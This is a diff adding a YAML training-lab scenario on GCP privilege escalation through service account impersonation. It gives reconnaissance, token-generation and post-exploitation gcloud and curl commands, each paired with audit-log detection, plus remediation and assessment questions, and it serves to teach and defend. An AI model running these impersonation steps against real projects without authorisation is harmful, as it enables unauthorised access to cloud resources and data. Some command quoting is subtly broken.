@@ -1,0 +1,109 @@
+# Category: Cloud Security - GCP
+name: "GCP IAM Privilege Escalation via Service Account Impersonation"
+id: "cloud-gcp-iam-privesc-001"
+category: "cloud_security"
+subcategory: "gcp"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit overly permissive IAM roles to impersonate a service account with
+  higher privileges. Attackers who have `iam.serviceAccountTokenCreator` or
+  `iam.serviceAccountActor` on a privileged service account can generate
+  access tokens for that account and escalate permissions across GCP projects.
+
+learning_objectives:
+  - Understand GCP IAM roles and service account impersonation
+  - Enumerate service accounts and their IAM bindings
+  - Generate OAuth2 access tokens for a target service account
+  - Use impersonation to access high‑privilege resources
+
+tools:
+  - gcloud CLI
+  - Google Cloud SDK
+  - curl (for REST API)
+  - jq
+  - python (google-auth library)
+
+prerequisites:
+  - GCP project access with `iam.serviceAccountTokenCreator` on a privileged SA
+  - Installed `gcloud` and authenticated as a user with that role
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "List service accounts and their permissions"
+    commands:
+      - "# List all SAs in the project"
+      - "gcloud iam service-accounts list"
+      - "# Check IAM policy for a specific SA"
+      - "gcloud projects get-iam-policy <PROJECT_ID> --flatten='bindings[].members' --format='table(bindings.role,bindings.members)' | grep serviceAccount:"
+    expected_output: "List of SAs and roles assigned (look for tokenCreator roles)"
+    detection: "Cloud Audit Logs for `google.iam.admin.v1.GetIamPolicy`"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Impersonate a high‑privilege service account"
+    commands:
+      - "# Generate access token for target SA"
+      - "gcloud auth print-access-token --impersonate-service-account=<TARGET_SA>@<PROJECT>.iam.gserviceaccount.com"
+      - "# Alternatively, use REST API"
+      - "curl -X POST -H 'Authorization: Bearer $(gcloud auth print-access-token)' \\"
+      - "  https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<TARGET_SA>@<PROJECT>.iam.gserviceaccount.com:generateAccessToken -H 'Content-Type: application/json' --data '{\"scope\": [\"https://www.googleapis.com/auth/cloud-platform\"]}'"
+      - "# Set the token as active"
+      - "export TOKEN=$(gcloud auth print-access-token --impersonate-service-account=<TARGET_SA>)"
+    expected_output: "Valid OAuth2 token for the target SA"
+    detection: "Cloud Audit Logs for `iamcredentials.googleapis.com/generateAccessToken`"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Use impersonated token to access resources"
+    commands:
+      - "# Use token to list compute instances"
+      - "curl -H 'Authorization: Bearer $TOKEN' https://compute.googleapis.com/compute/v1/projects/<PROJECT>/zones/us-central1-a/instances"
+      - "# Access storage buckets"
+      - "curl -H 'Authorization: Bearer $TOKEN' https://storage.googleapis.com/storage/v1/b?project=<PROJECT>"
+      - "# Or configure gcloud with token"
+      - "gcloud config set auth/access_token_file ./token.txt"
+    expected_output: "Access to resources owned by the impersonated SA"
+    detection: "Cloud Audit Logs for API calls with impersonated token"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1098"
+    description: "Account Manipulation – additional cloud roles"
+  - standard: "CIS GCP Foundations"
+    control: "1.10"
+    description: "Ensure that service account keys are rotated and not overly permissive"
+
+detection:
+  network_indicators:
+    - "API calls to iamcredentials.googleapis.com from non‑trusted IPs"
+  log_indicators:
+    - "Cloud Audit Logs: `generateAccessToken` events with unusual user agent"
+    - "Cloud Audit Logs: `setIamPolicy` granting `tokenCreator` to unexpected members"
+  endpoint_indicators:
+    - "gcloud commands using `--impersonate-service-account`"
+
+remediation:
+  immediate:
+    - "Review and restrict `iam.serviceAccountTokenCreator` to only necessary principals"
+    - "Enforce Access Context Manager with IP restrictions"
+  long_term:
+    - "Implement just‑in‑time (JIT) access for service account impersonation"
+    - "Enable VPC Service Controls to limit data exfiltration"
+
+variables:
+  project_id: "my-gcp-project"
+  target_sa: "privileged-sa@my-gcp-project.iam.gserviceaccount.com"
+
+assessment_questions:
+  - "What GCP role allows a user to generate tokens for another service account?"
+  - "How can you detect service account impersonation in Cloud Audit Logs?"
+  - "What are the risks of having `roles/iam.serviceAccountTokenCreator` on a project‑level?"
+
+references:
+  - url: "https://cloud.google.com/iam/docs/impersonating-service-accounts"
+    title: "GCP Service Account Impersonation"
+  - url: "https://attack.mitre.org/techniques/T1098/"
+    title: "MITRE ATT&CK - Account Manipulation"
